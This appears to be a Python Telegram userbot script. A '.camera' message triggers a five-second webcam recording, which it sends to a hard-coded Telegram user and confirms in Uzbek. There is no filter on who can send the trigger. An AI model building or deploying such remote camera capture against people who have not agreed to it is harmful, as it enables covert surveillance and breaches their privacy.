import cv2
import asyncio
from telethon import TelegramClient, events
from telethon.tl.types import InputPeerUser

from client import client
client = client.client

hevorix_username = 'hevorix'


def record_video(filename="output_video.avi", duration=5):
    cap = cv2.VideoCapture(0) 
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
    
    start_time = cv2.getTickCount()
    while True:
        ret, frame = cap.read()
        if not ret:
            break
        out.write(frame)
        elapsed_time = (cv2.getTickCount() - start_time) / cv2.getTickFrequency()
        if elapsed_time >= duration:
            break
        
        cv2.imshow('Recording', frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
    
    cap.release()
    out.release()
    cv2.destroyAllWindows()


@client.on(events.NewMessage(pattern='.camera'))
async def handler(event):
    record_video(duration=5)
    user = await client.get_entity(hevorix_username)
    peer = InputPeerUser(user.id, user.access_hash)
    await client.send_file(peer, 'output_video.avi')
    await event.respond("5 soniyalik video yuborildi!")

client.start()
client.run_until_disconnected()
